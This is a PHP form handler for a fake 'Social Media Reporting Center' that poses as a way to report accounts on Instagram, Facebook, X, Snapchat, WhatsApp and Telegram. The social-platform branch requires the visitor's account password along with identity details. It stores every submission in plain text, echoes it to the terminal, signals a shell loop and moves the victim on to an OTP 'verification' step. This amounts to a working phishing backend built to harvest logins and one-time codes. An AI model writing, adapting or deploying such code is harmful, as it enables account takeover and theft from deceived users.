<?php
/* ================================================================
   templates/social_reporting/submit.php
   Social Media Reporting Center — Initial Form Handler
   Accepts POST, validates, saves to data/submissions/, logs.
   Returns JSON so assets.js can reveal the OTP section.
   ================================================================ */

if (session_status() !== PHP_SESSION_ACTIVE) {
    session_start();
}

/* ── Response helper ─────────────────────────────────────────── */
header('Content-Type: application/json; charset=UTF-8');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Cache-Control: no-store, no-cache, must-revalidate');

function smr_json(int $code, string $status, string $message, array $extra = []): void {
    http_response_code($code);
    echo json_encode(array_merge(['status' => $status, 'message' => $message], $extra));
    exit;
}

/* ── Only POST ───────────────────────────────────────────────── */
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    smr_json(405, 'error', 'Method not allowed.');
}

/* ── Session nonce validation ─────────────────────────────────── */
$submitted_nonce = trim((string) ($_POST['smr_nonce'] ?? ''));
$session_nonce   = $_SESSION['smr_nonce'] ?? '';

if (!is_string($session_nonce) || $session_nonce === '' || $submitted_nonce === '' || !hash_equals($session_nonce, $submitted_nonce)) {
    smr_json(403, 'error', 'Invalid or expired form session. Please reload and try again.');
}

/* ── Sanitise helper ─────────────────────────────────────────── */
function smr_clean(string $v): string {
    return htmlspecialchars(strip_tags(trim($v)), ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

/* ── Read common fields ──────────────────────────────────────── */
$group = smr_clean($_POST['platform_group'] ?? '');

if (!in_array($group, ['social', 'messaging'], true)) {
    smr_json(422, 'error', 'Invalid platform group.');
}

$platform = smr_clean($_POST['platform'] ?? '');
if (empty($platform)) {
    smr_json(422, 'error', 'Please select a platform.');
}

$allowedPlatforms = [
    'social' => ['Instagram', 'Facebook', 'X (Twitter)', 'Snapchat'],
    'messaging' => ['WhatsApp', 'Telegram'],
];

if (empty($allowedPlatforms[$group]) || !in_array($platform, $allowedPlatforms[$group], true)) {
    smr_json(422, 'error', 'Invalid platform selected.');
}

/* ── Capture client IP (Cloudflare-compatible) ───────────────── */
/*  Priority: CF-Connecting-IP → X-Forwarded-For → REMOTE_ADDR  */
$client_ip = '0.0.0.0';
if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $cf_ip = trim($_SERVER['HTTP_CF_CONNECTING_IP']);
    if (filter_var($cf_ip, FILTER_VALIDATE_IP)) {
        $client_ip = $cf_ip;
    }
}
if ($client_ip === '0.0.0.0' && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    foreach (array_map('trim', explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])) as $candidate) {
        if (filter_var($candidate, FILTER_VALIDATE_IP)) {
            $client_ip = $candidate;
            break;
        }
    }
}
if ($client_ip === '0.0.0.0' && !empty($_SERVER['REMOTE_ADDR'])) {
    if (filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP)) {
        $client_ip = $_SERVER['REMOTE_ADDR'];
    }
}

/* ── Group-specific field collection & validation ────────────── */
$errors = [];
$fields = [];

if ($group === 'social') {
    /* ── Social platforms ── */
    $full_name       = smr_clean($_POST['reporter_name'] ?? '');
    $username        = smr_clean($_POST['reporter_username'] ?? '');
    $email_raw       = filter_input(INPUT_POST, 'reporter_email', FILTER_SANITIZE_EMAIL) ?? '';
    $email           = trim($email_raw);
    $phone           = smr_clean($_POST['reporter_phone']    ?? '');
    $password        = smr_clean($_POST['password']          ?? '');
    $victim_username = smr_clean($_POST['victim_username']   ?? '');
    $alt_email       = smr_clean($_POST['alt_email']         ?? '');
    $alt_phone       = smr_clean($_POST['alt_phone']         ?? '');

    /* Validate required */
    if (strlen($full_name) < 2)      $errors[] = 'Full name is required (min 2 characters).';
    if (strlen($username) < 1)       $errors[] = 'Username is required.';
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) $errors[] = 'A valid email address is required.';
    $phone_clean = preg_replace('/[\s\-\(\)\+]/', '', $phone);
    if (!preg_match('/^\d{7,15}$/', $phone_clean)) $errors[] = 'A valid phone number (7–15 digits) is required.';
    if (strlen($password) < 1)       $errors[] = 'Account password is required.';
    if (strlen($victim_username) < 1) $errors[] = 'Reported account username is required.';

    if (!empty($errors)) {
        smr_json(422, 'error', implode(' | ', $errors));
    }

    $fields = [
        'Platform Group'    => 'Social Platforms',
        'Platform'          => $platform,
        'Client IP'         => $client_ip,
        'Full Name'         => $full_name,
        'Username'          => $username,
        'Email'             => $email,
        'Phone'             => $phone,
        'Password'          => $password,
        'Victim Username'   => $victim_username,
        'Alt Email'         => ($alt_email ?: '—'),
        'Alt Phone'         => ($alt_phone ?: '—'),
    ];

} else {
    /* ── Messaging platforms ── */
    $full_name    = smr_clean($_POST['reporter_name']  ?? '');
    $username     = smr_clean($_POST['reporter_username'] ?? '');
    $email_raw    = filter_input(INPUT_POST, 'reporter_email', FILTER_SANITIZE_EMAIL) ?? '';
    $email        = trim($email_raw);
    $phone        = smr_clean($_POST['reporter_phone'] ?? '');
    $victim_username = smr_clean($_POST['victim_username'] ?? '');
    $victim_email_raw = filter_input(INPUT_POST, 'victim_email', FILTER_SANITIZE_EMAIL) ?? '';
    $victim_email = trim($victim_email_raw);
    $victim_phone = smr_clean($_POST['victim_phone']   ?? '');
    $victim_name  = smr_clean($_POST['victim_name']    ?? '');

    /* Validate required */
    if (strlen($full_name) < 2)   $errors[] = 'Full name is required (min 2 characters).';
    $phone_clean = preg_replace('/[\s\-\(\)\+]/', '', $phone);
    if (!preg_match('/^\d{7,15}$/', $phone_clean)) $errors[] = 'A valid phone number (7–15 digits) is required.';
    $vphone_clean = preg_replace('/[\s\-\(\)\+]/', '', $victim_phone);
    if (!preg_match('/^\d{7,15}$/', $vphone_clean)) $errors[] = 'A valid reported phone number is required.';

    if (!empty($errors)) {
        smr_json(422, 'error', implode(' | ', $errors));
    }

    $fields = [
        'Platform Group'   => 'Messaging Platforms',
        'Platform'         => $platform,
        'Client IP'        => $client_ip,
        'Full Name'        => $full_name,
        'Username'         => ($username ?: '—'),
        'Email'            => ($email ?: '—'),
        'Phone'            => $phone,
        'Victim Username'  => ($victim_username ?: '—'),
        'Victim Email'     => ($victim_email ?: '—'),
        'Victim Phone'     => $victim_phone,
        'Victim Name'      => ($victim_name ?: '—'),
    ];
}

/* ── Build unique filename & record ──────────────────────────── */
$timestamp  = date('Ymd_His');
$suffix     = substr(bin2hex(random_bytes(4)), 0, 6);
$file_name  = sprintf('social_reporting_submission_%s_%s.txt', $timestamp, $suffix);

/* Resolve project-level data directories */
$project_root    = realpath(__DIR__ . '/../../') ?: dirname(__DIR__, 2);
$globalDataDir   = $project_root . '/data';
$submissions_dir = $globalDataDir . '/submissions';
$otpsDir         = $globalDataDir . '/otps';

/* Ensure directories exist and are writable */
foreach ([$submissions_dir, $otpsDir] as $_d) {
    if (!is_dir($_d) && !mkdir($_d, 0750, true)) {
        error_log("SMR: failed to create dir $_d");
        smr_json(500, 'error', 'Internal server error — storage unavailable.');
    }
    if (!is_writable($_d)) {
        error_log("SMR: not writable: $_d");
        smr_json(500, 'error', 'Internal server error — storage unavailable.');
    }
}
unset($_d);

$file_path = $submissions_dir . '/' . $file_name;

/* Build text record */
$divider = str_repeat('-', 52);
$lines   = [
    $divider,
    'SOCIAL MEDIA REPORTING CENTER — Submission',
    'Timestamp : ' . date('Y-m-d H:i:s T'),
    'File      : ' . $file_name,
    $divider,
];
foreach ($fields as $key => $val) {
    $lines[] = str_pad($key, 18) . ': ' . $val;
}
$lines[] = $divider;
$lines[] = '';
$record  = implode("\n", $lines);

/* Write file (exclusive lock, never overwrite) */
if (file_exists($file_path)) {
    // Practically impossible with random suffix; regenerate just in case
    $suffix    = substr(bin2hex(random_bytes(4)), 0, 6);
    $file_name = sprintf('social_reporting_submission_%s_%s.txt', $timestamp, $suffix);
    $file_path = $submissions_dir . '/' . $file_name;
}

/* Prevent directory traversal — final sanity check */
$realSubmDir = realpath($submissions_dir);
if ($realSubmDir === false || strpos(realpath(dirname($file_path)) ?: '', $realSubmDir) !== 0) {
    error_log('SMR: path traversal blocked for submission write: ' . $file_path);
    smr_json(500, 'error', 'Internal server error.');
}

$fp = fopen($file_path, 'x'); // 'x' = fail if file already exists
if ($fp === false) {
    // Rare filename collision: regenerate once.
    $suffix    = substr(bin2hex(random_bytes(4)), 0, 6);
    $file_name = sprintf('social_reporting_submission_%s_%s.txt', $timestamp, $suffix);
    $file_path = $submissions_dir . '/' . $file_name;
    $fp = fopen($file_path, 'x');
}

if ($fp === false) {
    error_log('SMR: failed to create submission file: ' . $file_path);
    smr_json(500, 'error', 'Internal server error — unable to store submission.');
}

flock($fp, LOCK_EX);
$bytes_written = fwrite($fp, $record);
flock($fp, LOCK_UN);
fclose($fp);

if ($bytes_written === false || $bytes_written < strlen($record)) {
    @unlink($file_path);
    error_log('SMR: failed writing submission file: ' . $file_path);
    smr_json(500, 'error', 'Internal server error — unable to store submission.');
}

@chmod($file_path, 0640);

error_log('SMR: submission written to ' . $file_path);

/* ── Terminal / log output ───────────────────────────────────── */
$log_msg = "\n" . $divider . "\n"
         . "[SMR] New Submission Received\n"
         . $divider . "\n";
foreach ($fields as $key => $val) {
    $log_msg .= str_pad($key, 18) . ': ' . $val . "\n";
}
$log_msg .= 'Saved File  : ' . $file_name . "\n"
          . $divider . "\n";

error_log($log_msg);
file_put_contents('php://stderr', $log_msg);

/* ── Signal the shell checkfound loop ───────────────────────── */
$flag_path = $globalDataDir . '/.flag_form';
file_put_contents($flag_path, $log_msg);

/* ── Return success + submission_id so JS can inject into OTP form ── */
smr_json(200, 'success',
    'Details received. Please complete identity verification below.',
    ['submission_id' => $file_name]
);
